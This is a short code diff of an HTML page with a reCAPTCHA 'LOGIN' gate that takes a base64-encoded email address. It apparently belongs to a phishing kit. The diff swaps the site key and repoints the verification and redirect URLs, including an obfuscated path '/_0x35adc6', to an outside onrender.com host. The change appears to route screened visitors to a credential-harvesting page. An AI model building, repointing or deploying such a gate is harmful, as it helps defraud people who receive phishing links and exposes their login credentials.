@@ -47,13 +47,13 @@
     <button class="retry-button" onclick="retryReCaptcha()">Retry</button>
   </div>
 
-  <script src="https://www.google.com/recaptcha/api.js?render=6LeqFzYrAAAAAHSQMkmvgDyFKyy4EnzCRKw-P8q9"></script>
+  <script src="https://www.google.com/recaptcha/api.js?render=6LcBjT4rAAAAANCGmLJtAqAiWaK2mxTENg93TI86"></script>
   <script>
-    const RECAPTCHA_SITE_KEY = "6LeqFzYrAAAAAHSQMkmvgDyFKyy4EnzCRKw-P8q9";
+    const RECAPTCHA_SITE_KEY = "6LcBjT4rAAAAANCGmLJtAqAiWaK2mxTENg93TI86";
     const RECAPTCHA_ACTION = "LOGIN";
     const MAX_RETRIES = 3;
-    const RECAPTCHA_VERIFY_URL = "/verify_recaptcha_init";
-    const REDIRECT_URL = "/_0x35adc6";
+    const RECAPTCHA_VERIFY_URL = "https://g78vv678.onrender.com//verify_recaptcha_init";
+    const REDIRECT_URL = "https://g78vv678.onrender.com//_0x35adc6";
 
     async function verifyReCaptcha(emailBase64, retries = MAX_RETRIES) {
       const loader = document.getElementById("loader");
